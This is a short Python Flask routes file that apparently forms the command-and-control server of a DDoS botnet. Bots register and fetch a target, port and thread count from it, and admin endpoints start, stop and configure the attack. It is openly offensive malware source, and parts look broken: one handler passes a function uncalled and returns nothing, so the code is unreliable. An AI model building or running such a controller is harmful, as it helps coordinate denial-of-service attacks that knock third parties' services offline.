from app import app, request
from modules.botnet_controller import *


@app.route('/api/add-bot', methods=['GET', 'POST'])
def add_bot():
    if request.method == 'POST':
        bot_config = request.get_json()
        print(bot_config)
        top_up_botnet(get_botnet_config)


@app.route('/api/start-ddos')
def start_ddos():
    if not get_running():
        return {'start': get_running()}
    else:
        config = get_botnet_config()
        return {
            'start': config['running'],
            'target': config['ddos']['target'],
            'port': config['ddos']['port'],
            'threads': config['ddos']['threads']
        }


@app.route('/api/stop-ddos')
def stop_ddos():
    return {'stop': not get_running()}


@app.route('/admin/botnet-status')
def admin_get_botnet_status():
    return {'is_attack': get_running(), 'botnet': get_botnet()}

@app.route('/admin/attack-config')
def admin_get_attack_status():
    return get_botnet_config()


@app.route('/admin/stop_attack')
def admin_stop_attack():
    change_running(False)
    return admin_get_botnet_status()


@app.route('/admin/start_attack', methods=['GET', 'POST'])
def admin_start_attack():
    if request.method == 'POST':
        attack_config = request.get_json()
        change_botnet_config(attack_config)
        return attack_config
